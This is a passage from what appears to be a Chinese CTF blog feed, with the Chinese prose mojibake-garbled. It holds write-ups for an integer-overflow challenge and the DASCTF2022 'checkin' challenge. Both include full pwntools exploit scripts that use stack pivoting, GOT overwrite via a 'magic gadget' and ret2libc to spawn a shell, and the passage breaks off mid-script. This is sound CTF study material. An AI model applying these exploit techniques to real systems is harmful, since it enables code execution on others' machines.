æ­¤å®ƒçœŸæ­£çš„å€¼æ˜¯-0x8EDCBAAã€‚</p><p>è€Œæœ€ç»ˆæ”¾åˆ°è¿”å›åœ°å€é‡Œçš„å€¼ï¼Œæˆ‘ä»¬å¯ä¸ç®¡è¾“å…¥çš„æ—¶å€™æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Œåæ­£ç»“æœæ˜¯è¦è®©ä»–å­˜å‚¨æ—¶ä¸º0xf7123456ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©è¾“å…¥-0x8EDCBAAå³å¯</p><p>ä¸€å¥è¯æ€»ç»“å°±æ˜¯ï¼šè¾“å…¥çš„è´Ÿæ•°å­˜å‚¨åˆ°å†…å­˜é‡Œæ—¶ï¼Œå®ƒçš„è¡¥ç æ˜¯å¯ä»¥è¶…è¿‡0x7fffffffçš„é™åˆ¶ï¼Œä»è€Œå¯ä»¥å®ç°å†™å…¥0xf7è¿™ç§æ›´å¤§çš„å€¼ã€‚</p></blockquote><p>è§‚å¯Ÿä¸€ä¸‹0xf7123456å’Œ-0x8EDCBAAä¹‹é—´æœ‰ä»€ä¹ˆè§„å¾‹æ²¡æœ‰ï¼Œå¾ˆæ˜æ˜¾å¦‚æœç”¨0x100000000å‡å»0xf7123456ï¼Œå¾—åˆ°çš„å°±æ˜¯0x8EDCBAAï¼Œæ¢ä¸ªä½ç½®è®©0xf7123456å‡å»0x100000000ï¼Œè‡ªç„¶å¾—åˆ°çš„å°±æ˜¯-0x8EDCBAAã€‚</p><p>è´Ÿå€¼&#x3D;å¯¹åº”è¡¥ç -0x100000000(32ä½ç¨‹åº) è¿™ä¸ªå¼å­åœ¨magic gadgetä¸­ç®—åç§»ä¸ºè´Ÿçš„æ—¶å€™ä¹Ÿå‡ºç°è¿‡ã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p>PS:ç›´æ¥å¤åˆ¶ç²˜è´´æˆ‘è¿™ä¸ªè„šæœ¬æ˜¯æ‰“ä¸é€šçš„ï¼Œå› ä¸ºé‡Œé¢å‡ºç°äº†æˆ‘è‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬ï¼Œéœ€è¦å¤åˆ¶ç²˜è´´<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">è¿™é‡Œçš„æºç </a>æ–°å»ºä¸€ä¸ªåä¸ºtoolsçš„pyæ–‡ä»¶ã€‚æˆ–è€…æŠŠå‡ºç°çš„æˆ‘è‡ªå®šä¹‰çš„å‡½æ•°æ³¨é‡Šæ‰ï¼Œæ¢å›æ­£å¸¸çš„ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ez_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27271</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x0804930D)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_plt_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_got_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment">#result=local_search(&#x27;puts&#x27;,puts_addr,libc)</span></span><br><span class="line">result =long_search(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sys_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(bin_sh_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/91AutEp7wzOoacL.png" alt="image-20220526001630304" style="zoom:33%;" />]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> æ•´æ•°æº¢å‡º </tag>
            
            <tag> ARMæ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022_checkin</title>
      <link href="/posts/59b6daad.html"/>
      <url>/posts/59b6daad.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ å’Œæ”¶è·æœ‰ï¼š</p><p>1ã€æ ˆè¿ç§»ï¼Œä½•ä¸ºæ ˆï¼Ÿæœ¬æ¥æ ˆçš„å®šä¹‰å°±æ˜¯rspæŒ‡é’ˆä¸rbpæŒ‡é’ˆä¹‹é—´çš„å°±æ˜¯æ ˆã€‚rspåœ¨å“ªæ ˆå°±åœ¨å“ªï¼Œå› æ­¤ä¸¤æ¬¡leaveï¼Œæ ˆå°±å˜äº†ä¸¤æ¬¡ï¼Œè€ŒçœŸæ­£è·³åˆ°å˜åŒ–çš„æ ˆé‚£æ­¥æ˜¯åœ¨æœ€åçš„retæ‰§è¡Œçš„ã€‚ä¹Ÿç®—æ˜¯å¯¹æ ˆè¿ç§»åˆæœ‰äº†ä¸€ç‚¹æ–°çš„ç†è§£ã€‚</p><p>2ã€åˆ©ç”¨magic gadgetä¿®æ”¹gotè¡¨</p><p>3ã€è¿™é“é¢˜çš„æ ¸å¿ƒè€ƒå¯Ÿçš„å°±æ˜¯æ ˆè¿ç§»ä»¥åŠpayloadå¸ƒå±€ã€‚</p><p>4ã€å–magic gadgetä¸­çš„ebxæ—¶ï¼Œå¦‚æœebxçš„å€¼ä¸ºæ­£ï¼Œåˆ™ç›´æ¥å–ï¼Œå¦‚æœä¸ºè´Ÿï¼Œåˆ™åŠ 0x100000000å–è¡¥ç ã€‚</p><p>5ã€å¦‚æœå¯ä»¥çš„è¯ï¼Œè¿ç§»åˆ°bssæ®µå°½é‡è¿ç§»åˆ°åœ°å€é«˜ä¸€ç‚¹çš„åœ°æ–¹ã€‚è¿™æ¬¡æ‰“è¿œç¨‹çš„é‚£ä¸ªexpå°±æ˜¯å› ä¸ºbssæ®µè¿ç§»çš„å¤ªä½äº†ï¼Œå› ä¸ºæ˜¯ç ´åäº†æŸäº›æ•°æ®ï¼Œå¯¼è‡´æœ€åæ‰§è¡Œsystemå‡½æ•°çš„æ—¶å€™å¡ä½äº†ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220328113024633-1772975266.png"></p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p><img src="/../img/2706180-20220328113036736-1992703946.png"></p><p>å¯ä»¥å‘ç°ï¼Œè¿™é“é¢˜å°±ä¸€ä¸ªè¾“å…¥å‡½æ•°ï¼Œæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œä¸è¿‡è¿™ä¸ªreadå…·æœ‰16å­—èŠ‚çš„æº¢å‡ºã€‚è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½æƒ³çš„ï¼Œç›´æ¥å°±æ ˆè¿ç§»äº†ã€‚</p><p>ç„¶åè¾“å‡ºå‡½æ•°ä¹Ÿæ²¡æœ‰ï¼Œæ³„éœ²æ ˆåŸºåœ°å€è¿™ç§æƒ…å†µå°±æ’é™¤äº†ï¼Œé‚£å°±åªèƒ½è¿ç§»åˆ°bssæ®µã€‚</p><p>å…ˆè€ƒè™‘ä¸€ç‚¹ï¼Œæº¢å‡º16ä¸ªå­—èŠ‚ä»…ä»…åªèƒ½å»è¿ç§»ï¼Œæˆ‘ä»¬ä¼¼ä¹æ²¡æœ‰åŠæ³•å»bssæ®µå¸ƒç½®æ•°æ®ã€‚ä¸è¿‡è§‚å¯Ÿäº†ä¸€ä¸‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”±rbpç¡®å®šçš„ã€‚</p><p><img src="/../img/2706180-20220328113048327-1891287888.png"></p><p>è€Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æº¢å‡ºæ¥æ§åˆ¶rbpï¼Œå› æ­¤å°±ç›¸å½“äºå¯ä»¥æ§åˆ¶readçš„è¾“å…¥çš„åœ°æ–¹äº†ï¼Œæ§åˆ¶å®Œrbpçš„è¯ï¼Œåªèƒ½åœ¨æ§åˆ¶ä¸€ä¸ªè¿”å›åœ°å€ï¼Œæ—¢ç„¶æ§åˆ¶rbpå°±å·²ç»ç›¸å½“äºæ§åˆ¶rsiäº†ï¼Œé‚£å°±è¿”å›0x4011BFå†è¯»ä¸€æ¬¡ï¼ˆæ­¤æ—¶çš„readè¾“å…¥çš„åœ°å€å·²ç»æ˜¯bssæ®µäº†ï¼‰ã€‚<strong>é€‰å–å¾€bssæ®µè¾“å…¥çš„å†…å®¹ï¼Œä¸€å®šè¦æŠŠåœ°å€æŠ¬é«˜ï¼Œæˆ‘æœ€å¼€å§‹é€‰æ‹©çš„æ˜¯å¾€0x404100è¿™é‡Œå†™å…¥æ•°æ®å†è¿ç§»ï¼Œåˆ°äº†æœ€åæ‰§è¡Œsystemçš„è¿‡ç¨‹ä¸­ç»™å¡æ­»äº†</strong></p><p>readç»“æŸä¹‹åï¼Œåˆåˆ°äº†leave;retæŒ‡ä»¤ã€‚<strong>leaveæŒ‡ä»¤å°±æ˜¯mov rsp;rbp  pop rbp</strong>ï¼›</p><p>æ‰§è¡ŒleaveæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„rbpæ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æˆ‘ä»¬è¦æ§åˆ¶readå‡½æ•°çš„rsiæ¥è®¾å®šçš„rbpï¼ˆå®ƒç°åœ¨æ˜¯bssæ®µåœ°å€ï¼‰</p><p>æˆ‘è¿˜æ˜¯ç”¨å®é™…çš„æ•°æ®æ¥ä¸¾ä¾‹ä¸€ä¸‹å§ã€‚å‡è®¾æˆ‘ç¬¬ä¸€æ¬¡æ§åˆ¶rbpä¸ºï¼ˆ0x404600+0xa0ï¼‰ï¼Œé‚£rsiçš„å€¼å°±æ˜¯0x404600ï¼ˆå› ä¸ºbufä¸º-0xa0ï¼‰ï¼ˆå³æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ˜¯ä»0x404600å¤„å¼€å§‹è¾“å…¥çš„ï¼‰æˆ‘ä»¬å¯ä»¥è¾“å…¥0xB0ä¸ªæ•°æ®ï¼Œå› æ­¤åœ¨0x404600+0xa0è¿™ä¸ªåœ°æ–¹å†™å…¥0x404600ã€‚</p><p>æ­¤æ—¶æ‰§è¡Œreadç»“æŸåçš„leaveæŒ‡ä»¤æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220328113100100-154096690.png"></p><p><img src="/../img/2706180-20220328113111922-1348637698.png"></p><p><img src="/../img/2706180-20220328113121870-416873327.png"></p><p><img src="/../img/2706180-20220328113132111-1383092616.png"></p><p>æ€»ç»“ä¸€ä¸‹ä¸Šé¢çš„è¿‡ç¨‹ï¼Œ<strong>åŸæœ¬readè¯»å…¥å®Œæˆ‘ä»¬çš„æ•°æ®ï¼Œ<font color=#FF0000 >rbpæŒ‡å‘çš„æ‰æ˜¯æˆ‘ä»¬æƒ³è·³è½¬çš„åœ°æ–¹ï¼ˆå¹¶érbpæœ¬èº«ï¼‰</font>è€Œrbpæœ¬èº«è·ç¦»æˆ‘ä»¬æƒ³è·³è½¬çš„è¿˜æœ‰0xa0ä¸ªå­—èŠ‚ï¼Œä¸è¿‡è‡³å°‘rbpå°±åœ¨bssæ®µï¼Œæ‰§è¡Œäº†ç¬¬ä¸€æ¬¡leaveä¹‹åï¼Œ<font color=#FF0000 >rspä¹Ÿå°±å˜æˆäº†rbpçš„å€¼ï¼ˆåŒæ—¶ç”±äºpop rbpï¼Œæ­¤æ—¶çš„rbpåˆå˜æˆäº†rbpå½“åˆæ‰€æŒ‡å‘çš„å†…å®¹ï¼‰</font>ï¼Œæ­¤æ—¶å·²ç»è¿ç§»åˆ°bssæ®µäº†ï¼ˆåªä¸è¿‡æˆ‘ä»¬è¿˜è¦å†è¿ç§»åˆ°æˆ‘ä»¬å¸ƒç½®çš„æ•°æ®é‚£é‡Œï¼‰å› æ­¤å†æ¥ä¸€æ¬¡leaveï¼ˆè¿™ä¸ªæ˜¯ç¬¬äºŒæ¬¡readè¾“å…¥è¿‡å»çš„ï¼‰ï¼Œç”±äºleaveé‡Œçš„mov rsp,rbpï¼Œrspå†æ¬¡è¢«æ”¹å˜ï¼Œæœ€åå®Œæˆäº†è¿ç§»ï¼ˆè¿ç§»åˆ°äº†æˆ‘ä»¬å¸ƒç½®åœ¨bssæ®µé‡Œçš„æ•°æ®ï¼‰</strong></p><p>è‡³æ­¤çš„è¯ï¼Œå¤§ä½“æ¡†æ¶å°±å·²ç»å®Œæˆäº†ã€‚</p><p><strong>å‰©ä¸‹çš„å°±æ˜¯åœ¨bssæ®µä¸­å¸ƒå±€payloadäº†ï¼Œæœ¬åœ°çš„è¯éå¸¸ç®€å•ï¼Œç”¨magic gadgetå»å°†setvbufå‡½æ•°åœ°å€ä¿®æ”¹ä¸ºone_gadgetåœ°å€ï¼Œç„¶åè°ƒç”¨ä¸€ä¸‹setvbufå°±å®Œäº‹äº†ã€‚è¿œç¨‹çš„è¯ï¼Œroderickå¸ˆå‚…ç»™æˆ‘è¯´ï¼Œå› ä¸ºåŠ¨æ€åº“çš„åŸå› ï¼Œone_gadgetç”¨ä¸äº†ï¼Œå› æ­¤åªèƒ½æŠŠsetvbufæ”¹æˆputså‡½æ•°ï¼Œç„¶åå†åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œå®Œæˆret2libcã€‚</strong></p><p>è¿™é‡Œå…ˆç®€å•è¯´ä¸€ä¸‹magic gadgetå§ï¼Œç”¨ROPgadget â€“binary checkin â€“opcode 015dc3  å»æœè¿™ä¸ªgadgetçš„åœ°å€ã€‚015dc3æ˜¯è¿™ä¸ªgadgetçš„æœºå™¨ç ï¼ˆIDAé‡Œæ˜¯çœ‹ä¸è§çš„ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯æœºå™¨ç é”™ä½å¾—åˆ°çš„ï¼‰ã€‚</p><p>è¿™ä¸ªgadgeté•¿è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ˜¯åœ¨ç¬¬ä¸€è¡Œçš„addä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ret2csuæ§åˆ¶rbpå’Œrbxï¼Œç”±æ­¤å°±å¯ä»¥ç”¨è¿™ä¸ªä¿®æ”¹å‡½æ•°çš„gotè¡¨ã€‚ä»¥è¿™é“é¢˜ä¸ºä¾‹ï¼Œæˆ‘ç°åœ¨æƒ³å°†setvbufçš„çœŸå®åœ°å€æ”¹æˆone_gadgetåœ°å€ï¼Œåªéœ€è¦å°†rbp-0x3då†™æˆsetvbufçš„gotåœ°å€ï¼Œå°†ebxæ”¾æˆsetvbufå’Œone_gadgetäºŒè€…åœ¨libcåº“ä¸­çš„åç§»å³å¯ã€‚å†è°ƒç”¨è¿™ä¸ªone_gadgetï¼Œå³å¯å®Œæˆä¿®æ”¹gotè¡¨ã€‚</p><p>è¿™ä¸ªmagic gadgetå¨åŠ›è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œå…³äºmagic_gadgetè¯¦ç»†è§£é‡Šï¼Œæˆ‘å†™åœ¨äº†è¿™ç¯‡åšå®¢ä¸Š  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p><p>ä¸€å¥è¯æ¦‚æ‹¬æœ¬é¢˜æ€è·¯ï¼Œåˆ©ç”¨æ ˆè¿ç§»åˆ°bssæ®µï¼Œè°ƒè¯•å¸ƒç½®payloadï¼Œåˆ©ç”¨magic gadgetä¿®æ”¹setvbuf gotè¡¨ä¸ºæ‰“å°å‡½æ•°ï¼Œæœ€året2libcå³å¯ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>è¿™æ˜¯æ‰“æœ¬åœ°çš„ï¼Œç”¨çš„one_gadgetã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404100</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(<span class="number">0x8905c</span>)<span class="comment">#è¿™ä¸ª0x8905cä¸ºsetvbufå’Œone_gadgetäºŒè€…åœ°å€åœ¨libcåº“ä¸­çš„å·®å€¼</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404100</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ¯”èµ›ç»“æŸï¼Œè¿œç¨‹çš„ç¯å¢ƒå…³é—­äº†ï¼Œä¸è¿‡roderickå¸ˆå‚…è¿œç¨‹æ‰“é€šäº†ï¼Œæˆ‘æŒ‰ç…§ä»–è¿™ä¸ªæ€è·¯å†™çš„ï¼ŒåŠ¨æ€åº“æ¢æˆæ¯”èµ›ç»™çš„2.31ï¼Œç„¶åæ”¹æˆremoteï¼Œè¿œç¨‹ä¹Ÿæ˜¯okçš„ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27544)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_off=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_off=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_off))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(setvbuf_off))</span><br><span class="line">pop_rbp_addr=<span class="number">0x40113d</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404600</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401253</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> puts_off&gt;setvbuf_off:</span><br><span class="line">    offset=puts_off-setvbuf_off</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    offset=puts_off-setvbuf_off+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(offset)<span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(read_got_addr)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload+=p64(pop_rbp_addr)<span class="comment">#è®©rbpå»æŒ‡å‘0x404600ï¼ˆä½†æ˜¯rbpæœ¬èº«æ˜¯0x4046a0)ï¼Œè¿™æ ·readç»“æŸä¹‹åè§¦å‘äº†ç¬¬ä¸€æ¬¡leaveï¼Œå°±è®©rspçš„å€¼ä¸º0x4046a8ï¼ˆè¿™ä¸ªåœ°å€æŒ‡å‘çš„å°±æ˜¯leave;retï¼‰ï¼ˆæ­¤æ—¶rbpç”±äºpop rbpï¼Œè‡ªèº«çš„å€¼å˜æˆäº†0x404600ï¼‰ï¼Œç„¶ååˆ°retï¼Œå†æ¬¡æ‰§è¡Œäº†leave;ret</span></span><br><span class="line"><span class="comment">#ç¬¬äºŒæ¬¡leaveï¼Œrspæ‰ç®—å˜æˆäº†0x404608ï¼Œç„¶åretå®ç°äº†è½¬ç§»è‡³å¸ƒç½®åˆ°çš„systemå¤„ã€‚</span></span><br><span class="line">payload+=p64(<span class="number">0x404600</span>+<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4011BF</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404600</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(ret_addr)<span class="comment">#è¿™é“é¢˜éœ€è¦æ ˆå¯¹é½ï¼Œå…·ä½“ç»†èŠ‚æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ä¸Šæœ‰è®²ã€‚</span></span><br><span 